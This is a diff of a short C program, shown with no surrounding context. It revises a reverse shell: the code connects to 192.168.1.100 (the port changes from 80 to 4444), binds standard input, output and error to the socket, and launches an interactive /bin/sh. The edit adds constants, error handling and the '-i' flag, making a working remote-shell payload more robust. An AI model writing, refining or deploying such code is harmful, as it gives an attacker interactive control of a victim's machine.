@@ -1,25 +1,31 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
 #include <arpa/inet.h>
+
+#define SERVER_IP "192.168.1.100"
+#define SERVER_PORT 4444
 
 int main() {
     int sock;
-    struct sockaddr_in server;
-    char *argv[] = {"/bin/sh", NULL};
+    struct sockaddr_in server_addr;
+    char buffer[1024];
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
-    server.sin_family = AF_INET;
-    server.sin_port = htons(80);  
-    server.sin_addr.s_addr = inet_addr("192.168.1.100");  
+    server_addr.sin_family = AF_INET;
+    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);
+    server_addr.sin_port = htons(SERVER_PORT);
 
-    connect(sock, (struct sockaddr *)&server, sizeof(server));
+    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Connection failed");
+        exit(1);
+    }
+
     dup2(sock, 0);
     dup2(sock, 1);
     dup2(sock, 2);
-    
-    execve(argv[0], argv, NULL);
+    execl("/bin/sh", "sh", "-i", NULL);
+
     return 0;
 }
